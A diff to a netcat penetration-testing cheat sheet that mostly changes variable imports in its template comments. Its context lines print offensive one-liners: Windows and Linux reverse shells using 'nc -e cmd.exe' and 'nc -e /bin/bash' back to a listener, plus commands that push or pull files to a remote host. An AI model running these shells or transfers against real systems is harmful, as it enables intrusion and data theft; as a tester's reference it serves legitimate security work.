@@ -10,7 +10,7 @@ Set up a Netcat listener for incoming shells or file transfers.
 nc -lvnp $lport
 ```
 <!-- cheat
-var lport
+import lports
 -->
 
 ### Windows bind shell
@@ -43,8 +43,8 @@ Connect a Windows shell back to your listener.
 nc -nv $lhost $lport -e cmd.exe
 ```
 <!-- cheat
-var lhost
-var lport
+import lports
+import tun_ip
 -->
 
 ### Linux reverse shell
@@ -55,8 +55,8 @@ Connect a Linux shell back to your listener.
 nc -nv $lhost $lport -e /bin/bash
 ```
 <!-- cheat
-var lhost
-var lport
+import lports
+import tun_ip
 -->
 
 ### Download file via nc
@@ -70,6 +70,9 @@ echo "nc $rhost_ip $lport < $target_file_name" | xclip -sel clip; nc -lvnp $lpor
 import lports
 import tun_ip
 import files
+import domain_ip
+var target_file_name
+var downloaded_file_name
 -->
 
 ### Upload file via nc
@@ -77,14 +80,16 @@ import files
 Push a file to a target listener. Copies the matching listener command to clipboard. Logs md5 first so the receiver can confirm.
 
 ```sh title:"Push file to target listener, paste receiver, md5 first"
-echo "nc -lvnp $lport > $receiving_file_name" | xclip -sel clip; md5sum $file; nc $target $rport < $file
+echo "nc -lvnp $lport > $receiving_file_name" | xclip -sel clip; md5sum $file; nc $rhost_ip $rport < $file
 ```
 <!-- cheat
 import lports
 import tun_ip
 import files
+import domain_ip
 var target
 var rport
+var receiving_file_name
 -->
 
 ## ncat
